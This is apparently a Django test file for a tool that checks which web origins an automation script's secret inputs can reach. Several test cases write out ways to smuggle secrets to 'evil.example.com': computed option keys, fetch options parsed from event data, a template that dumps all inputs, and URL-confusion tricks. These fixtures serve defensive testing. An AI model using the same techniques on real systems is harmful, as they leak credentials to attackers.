from typing import Any

from django.test import SimpleTestCase

from parameterized import parameterized

from products.cdp.backend.secret_origins import UNBOUND, SecretOrigins, secret_origins

SENDS_TOKEN_TO_URL = "fetch(inputs.url, {'headers': {'Authorization': inputs.token}})"

WEBHOOK_HOG = """
let payload := {
  'headers': inputs.headers,
  'body': inputs.body,
  'method': inputs.method
}

if (not empty(inputs.signing_secret)) {
  payload['standard_webhooks'] := {
    'secret_input': 'signing_secret'
  }
}

if (not empty(inputs.secret_headers)) {
  payload['secret_headers_input'] := 'secret_headers'
}

let res := fetch(inputs.url, payload);

if (res.status >= 400) {
  throw Error(f'Webhook failed with status {res.status}: {res.body}');
}
"""


def _inputs(**values: Any) -> dict[str, dict[str, Any]]:
    return {key: {"value": value} for key, value in values.items()}


def _origins(*origins: str) -> frozenset[str]:
    return frozenset(origins)


class TestSecretHosts(SimpleTestCase):
    @parameterized.expand(
        [
            (
                "literal_url",
                "fetch('https://api.example.com/v1', {'headers': {'Authorization': inputs.token}})",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://api.example.com")},
            ),
            (
                "url_input",
                SENDS_TOKEN_TO_URL,
                _inputs(url="https://hooks.example.com/a", token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com")},
            ),
            (
                "secret_url_input",
                "fetch(inputs.url, {'method': 'POST'})",
                _inputs(url="https://hooks.example.com/abc?key=1"),
                {"url"},
                {"url": _origins("https://hooks.example.com")},
            ),
            (
                "f_string_with_literal_host",
                "fetch(f'https://api.example.com/{event.properties.path}', {'body': inputs.token})",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://api.example.com")},
            ),
            (
                "event_controls_the_host",
                SENDS_TOKEN_TO_URL,
                _inputs(url="https://{event.properties.host}/a", token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "host_not_terminated_before_an_unknown_part",
                "fetch(f'https://api.example.com{event.properties.path}', {'body': inputs.token})",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "nullish_fallback",
                "fetch(inputs.url ?? 'https://fallback.example.com', {'body': inputs.token})",
                _inputs(url="https://hooks.example.com/a", token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com", "https://fallback.example.com")},
            ),
            (
                "helper_function",
                """
                fun send(url, body) {
                  return fetch(url, {'body': body})
                }
                send('https://a.example.com', inputs.token)
                send('https://b.example.com', 'ping')
                """,
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://a.example.com", "https://b.example.com")},
            ),
            (
                "fetch_as_a_value",
                "let f := fetch\nf('https://hooks.example.com', {'body': inputs.token})",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "fetch_in_a_lambda_with_a_parameter_url",
                "let send := (u) -> fetch(u, {'body': inputs.token})\nsend('https://hooks.example.com')",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "webhook_template_resolves_secrets_by_key_name",
                WEBHOOK_HOG,
                {
                    **_inputs(url="https://hooks.example.com/a", method="POST", body={"event": "{event}"}),
                    **_inputs(signing_secret="whsec", secret_headers={"Authorization": "Bearer t"}),
                },
                {"signing_secret", "secret_headers"},
                {
                    "signing_secret": _origins("https://hooks.example.com"),
                    "secret_headers": _origins("https://hooks.example.com"),
                },
            ),
            (
                "two_secrets_to_two_origins",
                """
                fetch('https://a.example.com', {'headers': {'key': inputs.a_key}})
                fetch('https://b.example.com', {'headers': {'key': inputs.b_key}})
                """,
                _inputs(a_key="a", b_key="b"),
                {"a_key", "b_key"},
                {"a_key": _origins("https://a.example.com"), "b_key": _origins("https://b.example.com")},
            ),
            (
                "secret_used_outside_any_fetch",
                """
                let hashed := sha256Hex(inputs.salt)
                print(hashed)
                fetch('https://hooks.example.com', {'body': event.properties})
                """,
                _inputs(salt="s"),
                {"salt"},
                {"salt": _origins()},
            ),
            (
                "input_that_references_a_secret",
                "fetch('https://api.example.com', {'headers': {'Authorization': inputs.auth}})",
                _inputs(auth="Bearer {inputs.token}", token="t"),
                {"token"},
                {"token": _origins("https://api.example.com")},
            ),
            (
                "secret_copied_through_an_index_assignment",
                "let p := {}\np['h'] := inputs.token\nfetch(inputs.url, p)",
                _inputs(url="https://hooks.example.com", token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com")},
            ),
            (
                "options_from_event_data",
                "fetch('https://evil.example.com', jsonParse(event.properties.p))",
                _inputs(secret_headers={"Authorization": "Bearer t"}),
                {"secret_headers"},
                {"secret_headers": _origins("https://evil.example.com")},
            ),
            (
                "computed_option_key",
                "fetch('https://evil.example.com', {concat('secret_', 'headers_input'): concat('secret_', 'headers')})",
                _inputs(secret_headers={"Authorization": "Bearer t"}),
                {"secret_headers"},
                {"secret_headers": _origins("https://evil.example.com")},
            ),
            (
                "option_key_assigned_through_an_index",
                "let p := {}\nlet k := concat('secret_', 'headers_input')\np[k] := concat('secret_', 'headers')\n"
                "fetch('https://evil.example.com', p)",
                _inputs(secret_headers={"Authorization": "Bearer t"}),
                {"secret_headers"},
                {"secret_headers": _origins("https://evil.example.com")},
            ),
            (
                "by_name_option_with_a_computed_name",
                "fetch('https://evil.example.com', {'secret_headers_input': concat('secret_', 'headers')})",
                _inputs(secret_headers={"Authorization": "Bearer t"}),
                {"secret_headers"},
                {"secret_headers": _origins("https://evil.example.com")},
            ),
            (
                "fetch_without_arguments",
                "fetch()",
                _inputs(token="t"),
                {"token"},
                {"token": _origins()},
            ),
            (
                "fetch_to_a_url_from_event_data",
                "fetch(event.properties.url, {'body': inputs.token})\nfetch(event.properties.url)",
                _inputs(token="t", salt="s"),
                {"token", "salt"},
                {"token": UNBOUND, "salt": _origins()},
            ),
            (
                "liquid_input_that_dumps_every_input",
                "fetch(inputs.url, {'method': 'POST'})",
                {"url": {"value": "https://evil.example.com/{{ inputs | json }}", "templating": "liquid"}},
                {"api_key"},
                {"api_key": _origins("https://evil.example.com")},
            ),
            (
                "input_that_indexes_a_secret",
                "fetch(inputs.url, {'method': 'POST'})",
                _inputs(url="https://hooks.example.com/{inputs['token']}", token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com")},
            ),
            (
                "unparseable_code",
                "fetch(inputs.url, {",
                _inputs(url="https://hooks.example.com", token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
        ]
    )
    def test_secret_origins(
        self, _name: str, hog: str, inputs: dict, secret_keys: set[str], expected: dict[str, SecretOrigins]
    ) -> None:
        assert secret_origins(hog, inputs, [], secret_keys) == expected

    def test_mapping_inputs_add_their_origins(self) -> None:
        mapping_inputs = [_inputs(url="https://mapped.example.com/a")]

        origins = secret_origins(
            SENDS_TOKEN_TO_URL, _inputs(url="https://hooks.example.com", token="t"), mapping_inputs, {"token"}
        )

        assert origins == {"token": _origins("https://hooks.example.com", "https://mapped.example.com")}

    @parameterized.expand(
        [
            ("https://API.Example.COM./a", _origins("https://api.example.com")),
            ("https://api.example.com:8443/a", _origins("https://api.example.com:8443")),
            ("https://api.example.com:443/a", _origins("https://api.example.com")),
            ("http://api.example.com:80", _origins("http://api.example.com")),
            ("http://api.example.com:443/a", _origins("http://api.example.com:443")),
            ("https://bücher.example/a", UNBOUND),
            ("https://claßroom.example/a", UNBOUND),
            ("https://good.example.com@evil.example.com/a", UNBOUND),
            # The input is a hog template, which reads the doubled backslash as one literal backslash.
            (r"https://evil.example.com\\@good.example.com/a", UNBOUND),
            ("https://evil.example.com%2f.good.example.com/a", UNBOUND),
            ("https://evil.example.com\t.good.example.com/a", UNBOUND),
            ("ftp://files.example.com/a", UNBOUND),
            ("hooks.example.com/a", UNBOUND),
        ]
    )
    def test_origin_of_a_literal_url(self, url: str, expected: SecretOrigins) -> None:
        assert secret_origins(SENDS_TOKEN_TO_URL, _inputs(url=url, token="t"), [], {"token"}) == {"token": expected}
